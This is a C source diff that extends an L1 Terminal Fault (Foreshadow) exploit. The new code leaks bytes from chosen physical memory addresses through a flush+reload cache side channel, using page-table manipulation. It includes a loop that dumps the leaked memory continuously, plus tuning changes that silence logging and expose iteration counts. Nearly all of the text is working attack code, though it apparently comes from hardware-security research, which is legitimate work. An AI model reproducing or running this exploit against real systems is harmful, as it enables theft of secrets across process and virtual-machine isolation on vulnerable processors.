@@ -119,6 +119,177 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
   assert(!munmap(leak->leak, PAGE_SIZE));
 }
 
+size_t thijs_l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer, void (*l1tf_leak_function)(void *, reload_buffer_t)) {
+  const size_t nr_of_probes = 25;
+  const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
+  size_t *probes = malloc(probe_size);
+  memset(probes, 0, probe_size);
+
+  for (size_t probe_nr = 0; probe_nr < nr_of_probes; ++probe_nr) {
+    ssize_t nibble = -1;
+    size_t attempt = 0;
+    do {
+      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
+      l1tf_leak_function(leak_addr, reload_buffer[0]);
+      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
+      attempt += 1;
+    } while (nibble == -1 && attempt < 250);
+
+    if (nibble != -1) {
+      probes[nibble] += 1;
+    }
+  }
+
+  size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE - 1, &probes[1]) + 1;
+  if (probes[max] == 0) {
+    max = 0;
+  }
+
+  free(probes);
+
+  return max;
+}
+
+void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
+  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
+  fprintf(stderr, "Request leak and reload buffers\n");
+
+  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
+
+  leak_addr_t leak = l1tf_leak_buffer_create();
+  l1tf_leak_buffer_modify(&leak,  phys_addr);
+
+  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
+  memset(reload_buffer, 0, sizeof(reload_buffer_t));
+
+  const size_t results_size = sizeof(size_t[2 * length][16]);
+  size_t(*results)[16] = malloc(results_size);
+  memset(results, 0, results_size);
+
+  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
+  size_t start = (phys_addr & 0xfff);
+  assert(start + length < 0xfff);
+
+  size_t *assembled_results = malloc(length * sizeof(size_t));
+  const int bytes_per_line = 16;
+
+  while (1) {
+    for (int x = 0; x < 10; ++x) {
+      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
+        void *leak_addr = (char *)leak.leak + j;
+        size_t high =
+            thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
+        size_t low = thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
+
+        // Count the number of times each result has occured
+        results[i][high]++;
+        results[i + 1][low]++;
+      }
+    }
+
+    for (size_t i = 0; i < 2 * length; i += 2) {
+      size_t high = maximum(15, &results[i][1]) + 1;
+      if (results[i][high] < 2) {
+        high = 0;
+      }
+
+      size_t low = maximum(15, &results[i + 1][1]) + 1;
+      if (results[i + 1][low] < 2) {
+        low = 0;
+      }
+
+      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
+      assembled_results[i / 2] = result;
+      printf("%02lx ", result);
+
+      if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
+        // We would like to compare the results to the ground truth, to see the accuracy
+        printf("\t");
+        size_t line = i / (2 * bytes_per_line);
+        for (size_t byte = 0; byte < bytes_per_line; ++byte) {
+          size_t idx = byte + (line * bytes_per_line);
+          char out[3];
+          escape_ascii(assembled_results[idx], out);
+          printf("%s", out);
+        }
+
+        printf("          ");
+
+        printf("\n\r");
+      }
+    }
+
+    // Restore cursor position
+    printf("\033[%ldA\r", length / bytes_per_line);
+  }
+
+  free(assembled_results);
+  free(results);
+
+  l1tf_leak_buffer_free(&leak);
+  l1tf_reload_buffer_free(reload_buffer);
+
+}
+
+int THIJS_ITERS = 1000;
+
+char *thijs_l1tf_leak(uintptr_t base, const uintptr_t phys_addr, const size_t length)
+{
+	half_spectre_start(base, phys_addr);
+
+  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
+
+  leak_addr_t leak = l1tf_leak_buffer_create();
+  l1tf_leak_buffer_modify(&leak,  phys_addr);
+
+  memset(reload_buffer, 0, sizeof(reload_buffer_t));
+
+  const size_t results_size = sizeof(size_t[2 * length][16]);
+  size_t(*results)[16] = malloc(results_size);
+  memset(results, 0, results_size);
+
+  size_t start = (phys_addr & 0xfff);
+  assert(start + length < 0xfff);
+
+  for (int x = 0; x < THIJS_ITERS; ++x) {
+    for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
+      void *leak_addr = (char *)leak.leak + j;
+      size_t high =
+          thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
+      size_t low = thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
+
+      // Count the number of times each result has occured
+      results[i][high]++;
+      results[i + 1][low]++;
+    }
+  }
+
+  char *data = malloc(length);
+  for (size_t i = 0; i < 2 * length; i += 2) {
+    size_t high = maximum(15, &results[i][1]) + 1;
+    if (results[i][high] < 2) {
+      high = 0;
+    }
+
+    size_t low = maximum(15, &results[i + 1][1]) + 1;
+    if (results[i + 1][low] < 2) {
+      low = 0;
+    }
+
+    size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
+    data[i/2] = result;
+  }
+
+  free(results);
+
+  l1tf_leak_buffer_free(&leak);
+  l1tf_reload_buffer_free(reload_buffer);
+
+	half_spectre_stop();
+
+  return data;
+}
+
 void initialize_pteditor_lib(void) {
   fprintf(stderr, "Initializing PTEdit...\r");
   assert(!ptedit_init());
@@ -576,6 +747,7 @@ static void rbuf_flush(void)
 }
 
 static void l1tf_core(char *leak) {
+  const int verbose = 0;
   __asm__ volatile(
     "xor %%rax, %%rax \n"
     "mov %[stride], %%rcx \n"
@@ -593,7 +765,7 @@ static void l1tf_core(char *leak) {
   );
 
   #define PERIOD_ITERS 1000000
-  if (nr_l1tfs++ >= PERIOD_ITERS) {
+  if (verbose >= 1) if (nr_l1tfs++ >= PERIOD_ITERS) {
     double time = (clock_read() - period_start) / 1000000000.0;
     printf("l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %lu successful hits | %.2f%% succesfullness\n", PERIOD_ITERS/time/1000, success_hits, 100.0*success_hits/PERIOD_ITERS);
     nr_l1tfs = 0;
@@ -604,12 +776,13 @@ static void l1tf_core(char *leak) {
 
 static void rbuf_reload(void)
 {
+  const int verbose = 0;
   static int lc = 0;
   for (int i = BYTE_END-1; i >= BYTE_START; i--) {
     if (access_time(rbuf[i]) < THRESHOLD) {
       hit[i]++;
-      if (i > 0) printf("lc = %8d | hit at %2x\n", lc, i);
-      if (i > 0) success_hits++;
+      if (verbose >= 2) if (i > 0) printf("lc = %8d | hit at %2x\n", lc, i);
+      success_hits++;
     }
   }
   lc++;
@@ -617,7 +790,7 @@ static void rbuf_reload(void)
 
 static int hit_analyze(void)
 {
-  const int verbose = 1;
+  const int verbose = 0;
   if (verbose) {
     for (int i = 0; i < 256; i++)
       if (hit[i] > 0)
@@ -631,6 +804,8 @@ static int hit_analyze(void)
   return hit[0] ? 0 : -1;
 }
 
+int MATHE_ITERS = 1000;
+
 int do_l1tf_leak(char *leak) {
   memset(hit, 0, sizeof(hit));
   int attempt = 0;
@@ -641,12 +816,13 @@ int do_l1tf_leak(char *leak) {
     for (int i = 0; i < 500; i++)
       l1tf_core(leak);
     rbuf_reload();
-  } while (attempt++ < 1000);
+  } while (attempt++ < MATHE_ITERS);
   return hit_analyze();
 }
 
 char *l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
 {
+  const int verbose = 0;
   assert(0 < nr_bytes && nr_bytes <= 64 && (pa & (64-1)) + nr_bytes <= 64);
 
   // uint64_t bla = 0x0123456789abcdef;
@@ -659,7 +835,7 @@ char *l1tf_leak(uintptr_t base, uintptr_t pa, int nr_bytes)
   memset(secret, 0, nr_bytes);
 
   for (int i = 0; i < nr_bytes; i++) {
-    printf("l1tf_leak: at byte %d\n", i);
+    if (verbose >= 2) printf("l1tf_leak: at byte %d\n", i);
     char *leak = leak_addr.leak + (((pa + i) & 0xfff));
     secret[i] = do_l1tf_leak(leak);
     // secret[i] = do_l1tf_leak((char *)&bla + i);
